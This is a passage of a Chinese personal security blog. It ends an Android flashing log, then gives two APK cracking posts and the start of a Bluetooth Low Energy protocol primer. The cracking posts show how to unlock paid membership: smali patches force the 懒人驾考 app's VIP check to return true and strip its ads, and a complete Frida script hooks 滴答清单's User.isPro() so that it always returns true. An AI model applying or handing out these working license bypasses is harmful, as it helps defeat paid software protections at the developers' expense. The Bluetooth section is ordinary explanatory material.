class="line">extracting vendor.img (509 MB) to disk... took 3.057s</span><br><span class="line">Invalid sparse file format at header magic</span><br><span class="line">archive does not contain &#x27;vendor.sig&#x27;</span><br><span class="line">Resizing &#x27;vendor_b&#x27;                                OKAY [  0.007s]</span><br><span class="line">Sending sparse &#x27;vendor_b&#x27; 1/2 (262116 KB)          OKAY [  8.684s]</span><br><span class="line">Writing &#x27;vendor_b&#x27;                                 OKAY [  0.322s]</span><br><span class="line">Sending sparse &#x27;vendor_b&#x27; 2/2 (257860 KB)          OKAY [  8.539s]</span><br><span class="line">Writing &#x27;vendor_b&#x27;                                 OKAY [  0.334s]</span><br><span class="line">extracting vendor_dlkm.img (38 MB) to disk... took 0.181s</span><br><span class="line">archive does not contain &#x27;vendor_dlkm.sig&#x27;</span><br><span class="line">Resizing &#x27;vendor_dlkm_b&#x27;                           OKAY [  0.008s]</span><br><span class="line">Sending &#x27;vendor_dlkm_b&#x27; (39796 KB)                 OKAY [  1.332s]</span><br><span class="line">Writing &#x27;vendor_dlkm_b&#x27;                            OKAY [  0.089s]</span><br><span class="line">archive does not contain &#x27;vendor_other.img&#x27;</span><br><span class="line">Erasing &#x27;userdata&#x27;                                 OKAY [  0.218s]</span><br><span class="line">Erase successful, but not automatically formatting.</span><br><span class="line">File system type raw not supported.</span><br><span class="line">Erasing &#x27;metadata&#x27;                                 OKAY [  0.003s]</span><br><span class="line">Erase successful, but not automatically formatting.</span><br><span class="line">File system type raw not supported.</span><br><span class="line">Rebooting                                          OKAY [  0.000s]</span><br><span class="line">Finished. Total time: 397.746s</span><br></pre></td></tr></table></figure>



<h1 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h1><p>Android 入门教程：ROOT 权限的获取</p>
<p><a target="_blank" rel="noopener" href="https://sspai.com/post/24296#">https://sspai.com/post/24296#</a>!</p>
<p>模拟器安装xposed</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014602228/article/details/117921430">https://blog.csdn.net/u014602228/article/details/117921430</a></p>
<p>记一次Android刷机的小结（青橙GO T5）<br><a target="_blank" rel="noopener" href="https://jmsliu.cn/tech/%e8%ae%b0%e4%b8%80%e6%ac%a1%e5%ae%89%e5%8d%93%e5%88%b7%e6%9c%ba%e7%9a%84%e5%b0%8f%e7%bb%93.html">https://jmsliu.cn/tech/%e8%ae%b0%e4%b8%80%e6%ac%a1%e5%ae%89%e5%8d%93%e5%88%b7%e6%9c%ba%e7%9a%84%e5%b0%8f%e7%bb%93.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://tig3rhu.github.io/2024/01/02/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95/" data-id="clqwhkl4r0000ekvbbxa36fw7" data-title="Android各种机型刷机踩坑记录" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-65__逆向_懒人驾考逆向" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/02/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91/" class="article-date">
  <time class="dt-published" datetime="2024-01-02T14:42:38.648Z" itemprop="datePublished">2024-01-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/02/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91/">apk逆向__懒人驾考去会员</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>考驾照的时候，有人推荐了这个app,于是拿来刷题，发现要会员，于是逆了一下。</p>
<h1 id="懒人驾考逆向"><a href="#懒人驾考逆向" class="headerlink" title="懒人驾考逆向"></a>懒人驾考逆向</h1><h2 id="去除开屏广告（成功）"><a href="#去除开屏广告（成功）" class="headerlink" title="去除开屏广告（成功）"></a>去除开屏广告（成功）</h2><h3 id="确定activity"><a href="#确定activity" class="headerlink" title="确定activity"></a>确定activity</h3><p>前因：app 原本开屏有两个广告，直接用MT管理器启动“activity 记录”，可以看到连着有两个广告。看到activity 是SplashAcitvity。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207112117967.png"></p>
<p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207112137076.png"></p>
<h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p>在jadx中找到这个activity。可以看到开屏广告的有关函数和类。看到一个onSplashAdShow（）函数的实现。</p>
<p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231206225555751.png"><br>查看onSplashAdShow()函数的引用<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231206225712329.png"></p>
<h4 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h4><p>可以让这个case修改为close<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231206225649137.png"></p>
<p>最终分析调用的函数路径为</p>
<p>onSplashAdShow() – &gt; com.bytedance.sdk.openadsdk.x.p040if.p041if.p042if.Cfi.call() –&gt; com.bytedance.sdk.openadsdk.z.p046if.p047if.x.setSplashAdListener() –&gt; onSplashRenderSuccess() –&gt; com.bytedance.sdk.openadsdk.w.p037if.p038if.p039if.Cif.call()</p>
<h4 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h4><p>另一处修改的地方<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207134655449.png"></p>
<p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207135500830.png"></p>
<h4 id="第三处"><a href="#第三处" class="headerlink" title="第三处"></a>第三处</h4><p>这个函数会调用 r0() 和 o0()函数。</p>
<p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207142355039.png"></p>
<p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207144836662.png"></p>
<p>修改这个跳转，if-eqz 为 if-nez 直接到o0()函数。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207144710756.png"></p>
<h3 id="修改smali"><a href="#修改smali" class="headerlink" title="修改smali"></a>修改smali</h3><p>有两处可以去除广告。</p>
<h4 id="第一处-1"><a href="#第一处-1" class="headerlink" title="第一处"></a>第一处</h4><p>com.bytedance.sdk.openadsdk.x.p040if.p041if.p042if.Cfi.call()</p>
<p>把succedd 的case 跳转到close中。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207135843019.png"></p>
<h4 id="第二处-1"><a href="#第二处-1" class="headerlink" title="第二处"></a>第二处</h4><p>com.bytedance.sdk.openadsdk.w.p037if.p038if.p039if.Cif.call()</p>
<p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207140007019.png"></p>
<h4 id="第三处-1"><a href="#第三处-1" class="headerlink" title="第三处"></a>第三处</h4><p>if-eqz v1 ,; cond_26  如果v1 为0 ，跳转到26处。</p>
<p>if-nez v1,;  如果v1 不为0 ，跳转到26</p>
<p>if-ne v1 v2 如果不等于就跳转，改为eq</p>
<h2 id="开通会员"><a href="#开通会员" class="headerlink" title="开通会员"></a>开通会员</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208222030444.png"></p>
<h4 id="第一处-2"><a href="#第一处-2" class="headerlink" title="第一处"></a>第一处</h4><p>捕获这个按钮的点击事件。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208182714065.png"></p>
<p>从开启会员按钮处，点击，然后返回到主页面的时候会触发一些函数。</p>
<p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208182331538.png"><br>下面这个函数，就是判断放弃开启VIP。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208222111439.png"></p>
<p>如股票M 判断为真，那就直接结束这个vip购买的activity的。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208182443749.png"></p>
<p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207225838719.png"></p>
<p>找到一个判断是否开通会员的逻辑代码</p>
<p>openvipActivityNewB()<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208174706729.png"></p>
<h3 id="修改smali-1"><a href="#修改smali-1" class="headerlink" title="修改smali"></a>修改smali</h3><p>直接在M函数处返回1。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208222225733.png"></p>
<p>重新签名打包安装后，可以看到“永久会员”。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208222607848.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://tig3rhu.github.io/2024/01/02/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91/" data-id="clqwgn8g5000108vbb4ci9k9j" data-title="apk逆向__懒人驾考去会员" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-66__逆向_滴答清单去会员" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/02/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98/" class="article-date">
  <time class="dt-published" datetime="2024-01-02T14:34:09.299Z" itemprop="datePublished">2024-01-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/02/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98/">apk逆向__滴答清单去会员</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>android apk ： 滴答清单7.0.2.1 ( dida_dida_7021_release.apk )<br>frida version : frida 16.1.0</p>
<p>最近在使用滴答清单做记录，记录每天做的一些事情，但是看到基本的周表格都要会员，正好拿来练练手。</p>
<p>升级需要开通会员<br><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240102172841298.png"></p>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>先搜索会员，可以看到“already_pro_account” 的字符串。<br><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20231214160338897.png"></p>
<p>搜索“already_pro_account” 的字符串，可以看到有一个 user.isPro() 函数。</p>
<p><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20231214154149095.png"></p>
<p>进入到这个函数中，可以看到 </p>
<blockquote>
<p>this.title.setText(getString(user.isPro() ? R.string.alreay_pro_account : R.string.upgrade_to_premium));</p>
</blockquote>
<p>这段代码的意思是，如果获取到 user.isPro()函数为true,那么就显示alreay_pro_account （你已经是高级会员了）。<br>如果不是，那就显示为（升级到高级会员）</p>
<p><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20231214154035155.png"></p>
<p><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20231214154229385.png"></p>
<p>查看 isPro() 的代码</p>
<p><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20231214154001493.png"></p>
<h2 id="绕过会员"><a href="#绕过会员" class="headerlink" title="绕过会员"></a>绕过会员</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在 1431 行 直接 return v1 。 绕过判断。<br><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20231214162625895.jpeg"></p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>直接使用 Frida 的来hook 这个函数isPro()。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let User = Java.use(&quot;com.ticktick.task.data.User&quot;);</span><br><span class="line">User[&quot;isPro&quot;].implementation = function () &#123;true</span><br><span class="line">    console.log(&#x27;isPro is called&#x27;);</span><br><span class="line">    let ret = this.isPro();</span><br><span class="line">    console.log(&#x27;isPro ret value is &#x27; + ret);</span><br><span class="line">    return true;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<p>查看进程，这里要注意，可以看到这边进程中看到包名是 “cn.ticktick.task”， 但hook 的时候，会找系统中应用的base.apk内的实际函数路径，因此是“com.ticktick.task.data;”<br><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240102172313405.png"></p>
<p>hook 思路： 让isPro 函数永远返回true</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">Author       : tigerHu</span><br><span class="line">Version      : V1.0</span><br><span class="line">Date         : 2023-12-21 20:36:52</span><br><span class="line">Description  :</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import frida</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def adb_forward():</span><br><span class="line">    os.system(&#x27;adb forward tcp:27042 tcp:27042&#x27;)</span><br><span class="line">    os.system(&#x27;adb forward tcp:27043 tcp:27043&#x27;)</span><br><span class="line"></span><br><span class="line">jscode = &quot;&quot;&quot;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        let User = Java.use(&quot;com.ticktick.task.data.User&quot;);</span><br><span class="line">        User[&quot;isPro&quot;].implementation = function () &#123;</span><br><span class="line">            console.log(&#x27;isPro is called&#x27;);</span><br><span class="line">            let ret = this[&quot;isPro&quot;]();</span><br><span class="line">            console.log(&#x27;isPro ret value is &#x27; + ret);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#x27;type&#x27;] == &#x27;send&#x27;:</span><br><span class="line">        print(&quot;[*]  &#123;0&#125;&quot;.format(message[&#x27;payload&#x27;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line">        </span><br><span class="line">adb_forward()</span><br><span class="line"># 查找远程设备并附加到目标进程</span><br><span class="line"># frida.get_remote_device() 远程设备,模拟器</span><br><span class="line"># frida.get_usb_device  获取usb 设备</span><br><span class="line">process = frida.get_usb_device().attach(9288)</span><br><span class="line">#pid = device.spawn([&quot;com.android.chrome&quot;])</span><br><span class="line">#session = device.attach(pid)</span><br><span class="line">#device.resume(pid)</span><br><span class="line"></span><br><span class="line"># 在目标进程里创建脚本</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line"># 注册消息回调</span><br><span class="line">script.on(&quot;message&quot;, on_message)</span><br><span class="line">print(&#x27;[*] Hook Start Running&#x27;)</span><br><span class="line"># 加载创建好的javascript 脚本</span><br><span class="line">script.load()</span><br><span class="line"># 读取系统输入</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>


<p><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240102172157870.png"></p>
<p><img src="/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98.assets/image-20240102172706011.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://tig3rhu.github.io/2024/01/02/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98/" data-id="clqwggeio0000v4vb2zvdcanh" data-title="apk逆向__滴答清单去会员" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-45__蓝牙 sniff &amp; CTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/12/18/45__%E8%93%9D%E7%89%99%20sniff%20&%20CTF/" class="article-date">
  <time class="dt-published" datetime="2023-12-18T09:30:59.071Z" itemprop="datePublished">2023-12-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/12/18/45__%E8%93%9D%E7%89%99%20sniff%20&%20CTF/">蓝牙sniff&amp;CTF&amp;develop</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="蓝牙基础"><a href="#蓝牙基础" class="headerlink" title="蓝牙基础"></a>蓝牙基础</h2><h3 id="蓝牙标准"><a href="#蓝牙标准" class="headerlink" title="蓝牙标准"></a>蓝牙标准</h3><p>PDU : 协议数据单元，在一个传输单元中的有效传输数据。</p>
<h3 id="低功耗蓝牙消息交互流程"><a href="#低功耗蓝牙消息交互流程" class="headerlink" title="低功耗蓝牙消息交互流程"></a>低功耗蓝牙消息交互流程</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230702220906359.png"></p>
<h3 id="协议栈"><a href="#协议栈" class="headerlink" title="协议栈"></a>协议栈</h3><p>根据蓝牙协议栈架构图可以看出，蓝牙模块共有三大部分组成：</p>
<ul>
<li><p>Controller : 控制器，HCI以下</p>
<ul>
<li>controller 中的 PHY 层是用来指定BLE所用的无线频段、调制解调方式。由于BLE属于无线通信频率范围是2.400<del>2.4835GHz；为了同时支持多个设备，将整个频带分为40份，每份的带宽为2MHz，称为RF Channel,BLE的物理通道   频点为f&#x3D;2402+K*2 MHz  k&#x3D;0</del>39，带宽为2MHz的40个RF Channel，其中37，38，39 为广播信道。</li>
<li>Link Layer 链路层在40 个射频信道上收发数据，会在37个RF Channel 中选取一个，建立双方独立通信的通道，为了增加抗干扰性，会采用跳频技术(Hopping)。即在多个Channel 之间随机但有规律的切换。</li>
</ul>
</li>
<li><p>HOST：主机，L2CAP以及L2CAP以上。</p>
</li>
<li><p>HCI(Host Controller interface) : 主机控制接口，传输主机host 和controller 之间的接口，记录了从host 到controller 的commands 命令以及controller 到host 的响应events</p>
</li>
</ul>
<p>人们常说的蓝牙属于传统(经典)蓝牙还是BLE蓝牙，说的是蓝牙的规格，蓝牙的规格是由Controller 所决定的。</p>
<ul>
<li>BR&#x2F;EDR Controller ： 单模蓝牙模块，也就是常说的经典蓝牙。</li>
<li>LE Controller ：单模， BLE 蓝牙模块</li>
<li>BR&#x2F;EDR 和 LE Controller 组成的 Controller： 双模蓝牙模块，即支持传统蓝牙也支持BLE低功耗蓝牙。</li>
</ul>
<h4 id="BLE-HOST"><a href="#BLE-HOST" class="headerlink" title="BLE HOST"></a><strong>BLE HOST</strong></h4><p>L2CAP 层： 负责管理PDU数据的顺序、调度、分片、重组等功能，对蓝牙数据提供封装服务；<br>HCI层： 向上为主机提供软件应用程序接口（API），对外为外部硬件控制接口，可以通过串口、SPI、USB来实现设备控制。<br>SMP层：负责配对和密钥分发，实现安全连接和数据交换。<br>GAP层： 负责设备访问模式和进程，包含设备发现、建立连接、终止连接。初始化安全特性和设备配置，提供。<br>GATT层： 蓝牙设备之间的数据通信。</p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230701115920366.png"></p>
<h4 id="HCI-协议"><a href="#HCI-协议" class="headerlink" title="HCI 协议"></a>HCI 协议</h4><p>HCI 协议是HCI 接口最底层的协议，可根据传输层的介质分为不同类型<br>•UART传输层：在btsnoop中表示为hci_h4<br>•USB传输层：在btsnoop中表示为hci_h5<br>•SD传输层：Secure Digital</p>
<p>HCI 数据包分为command 、event 和 data 三种类型。command 表示host 发送给Controller 的命令，event 为Controller 发送给Host 的事件，data 通常是实际的蓝牙传输数据。</p>
<h4 id="L2CAP-协议"><a href="#L2CAP-协议" class="headerlink" title="L2CAP 协议"></a>L2CAP 协议</h4><p>蓝牙的通信协议格式为<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230713221729110.png"></p>
<p>Access Address 接入地址：用于是被是数据包还是广播包。<br><strong>ps:</strong> Octet和字节是相同的概念，都表示计算机中存储和传输数据的基本单位。在计算机科学中，一个字节由8个二进制位组成。因此，8位字节等于1字节。</p>
<p>PDU，ＢLE在Link Layer的PDU长度最大为<strong>257 octets</strong>。<br>Link Layer 总长度在9~264bytes(1+8 ~257+8)?????</p>
<h4 id="GATT"><a href="#GATT" class="headerlink" title="GATT"></a>GATT</h4><h5 id="ATT-属性协议"><a href="#ATT-属性协议" class="headerlink" title="ATT 属性协议"></a>ATT 属性协议</h5><p>BLE 里面的数据以属性 ( Attribute ) 方式存在，每条属性由四素质组成：</p>
<ul>
<li>属性句柄(Attribute handle) : 正如我们可以使用内存地址查找内存中的内容一样，ATT属性的句柄也可以协助我们找到相应的属性，例如第一个属性的句柄是0x001,第二个属性的句柄是0x002, 以此类推，最大可以到0xFFFF。</li>
<li>属性类型（Attribute UUID）： 每个数据有自己需要代表的意思，例如表示温度、发射功率、电池等等各种各样的信息。蓝牙组织（Bluetooth SIG）对常用的一些数据类型进行了归类，赋予不同的数据类型不同的识别码（UUID），例如0x2A09 表示电池信息，0x2A6E 表示温度信息。UUID 可以是16比特的（16-bit UUID）,也可以是128比特的（128-bit UUID）。</li>
<li>属性值（Attribute Value）: 属性值是每个属性真正要承载的信息，其他3个元素都是为了让对方能够更好的获取属性值。有些属性的长度是固定，例如电池属性（Battery Level）的长度只有1个字节，为需要表示的数据仅有0<del>100%，而 1 字节足以表示 1</del>100 的范围；而有些属性的长度的是可变的，例如基于BLE实现的透传模块。</li>
<li>属性许可（Attribute Permissions): 每个属性对各自的属性值有相应的访问限制，比如有些属性是可读、有些是可写的、有些是可读又可写的等等。</li>
</ul>
<h3 id="Service-Characteristic-Descriptor"><a href="#Service-Characteristic-Descriptor" class="headerlink" title="Service Characteristic Descriptor"></a>Service Characteristic Descriptor</h3><p>BLE 分为三部分Service(服务项)、Characteristic（特征值）、Descriptor（描述符），这三部分都由UUID做为唯一标示符。</p>
<ul>
<li><p>一个蓝牙4.0的终端可以包含多个Service</p>
</li>
<li><p>一个Service 可以包含多个Characteristic </p>
</li>
<li><p>一个Characteristic 包含一个Value 值 和多个Descriptor </p>
</li>
<li><p>一个Descriptor 包含一个Value</p>
<p>   BLE 规范中定义了GAP 和 GATT 两个配置文件。<br>   GAP 层负责设备访问模式和进程，包含设备发现、建立连接、终止连接。初始化安全特性和设备配置。<br>   GATT 层用于已连接的蓝牙设备之间的数据通信。</p>
</li>
</ul>
<p>GATT 是用于与BLE设备通信的协议。该设备是一个服务端，连接到设备的计算机或者移动设备是客户端，设备公开包含特征的服务，这些特征值具有值和一些可能的描述符，具体的结构如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">BLE server</span><br><span class="line">    |-- Service</span><br><span class="line">    |      |-- Characteristic</span><br><span class="line">    |      |      |-- Value</span><br><span class="line">    |      |      |-- Descriptor</span><br><span class="line">    |      |      |-- Descriptor</span><br><span class="line">    |      |     ...</span><br><span class="line">    |      |-- Characteristic</span><br><span class="line">    |      |      |-- Value</span><br><span class="line">    |      |      |-- Descriptor</span><br><span class="line">    |      |      |-- Descriptor</span><br><span class="line">    |      |     ...</span><br><span class="line">    |     ...</span><br><span class="line">    |-- Service</span><br><span class="line">    |      |-- Characteristic</span><br><span class="line">    |      |      |-- Value</span><br><span class="line">    |      |      |-- Descriptor</span><br><span class="line">    |      |      |-- Descriptor</span><br><span class="line">    |      |     ...</span><br><span class="line">    |      |-- Characteristic</span><br><span class="line">    |      |      |-- Value</span><br><span class="line">    |      |      |-- Descriptor</span><br><span class="line">    |      |      |-- Descriptor</span><br><span class="line">    |      |     ...</span><br><span class="line">    |     ...</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230720175832564.png"></p>
<h3 id="数据交换"><a href="#数据交换" class="headerlink" title="数据交换"></a>数据交换</h3><p>把存有数据（属性）的设备叫做服务器（Server), 而将获取别人设备数据的设备叫做客户端（Client）。下面是服务器和客户端间的常用操作：</p>
<ul>
<li><strong>客户端给服务端发数据</strong>，通过对服务器的数据进行写操作（Write）,来完成数据发送工作。写操作分两种，一种是写入请求（Write Request）, 一种是写入命令（Write Command）， 两者的主要区别在于前者需要对方回复响应（Write Response）,而后者不需要对方回复响应。</li>
<li><strong>服务端给客户端发数据</strong>，主要通过服务端指示（Indication）或者通知（Notification）的形式，实现将服务端更新的数据发给客户端。与写操作类似，指示和通知的主要区别是前者需要对方设备在收到数据指示后，进行回复（Confirmation）。</li>
<li>客户端也可以主动通过读操作读取服务端的数据。</li>
</ul>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230727234105794.png"></p>
